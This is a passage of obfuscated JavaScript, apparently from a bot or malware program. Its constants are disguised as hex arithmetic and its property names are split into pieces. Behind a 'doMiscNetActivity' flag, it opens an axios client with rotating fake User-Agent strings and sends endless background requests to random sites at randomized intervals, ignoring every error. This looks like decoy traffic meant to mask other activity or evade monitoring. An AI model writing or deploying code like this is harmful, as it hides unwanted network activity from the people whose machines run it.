    for (let l = 0x2 * 0x108 + 0x1c31 + -0x1e41; l < -0x246 + -0x12a2 + 0x34 * 0x67; l++)
      setTimeout(f, (-0x1c549 * 0x1 + 0x67c * -0x5 + -0x595 * -0x81) * l * getRandomInt(0x21a6 + -0x151 * -0x11 + 0x47 * -0xca, -0x1bb2 + -0x1493 + 0x3048));
  }, 0x238eb1 + 0x4f4b * -0x3d + 0x2644ae);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x350d + -0x121 * 0x2b + -0xb6b * -0x2) * getRandomInt(-0x228f + -0x6f7 + -0x2987 * -0x1, 0x142 * 0x13 + 0xfef + 0x1 * -0x27d0));
}, -0x1592 + -0x2b + -0x1 * -0x1621);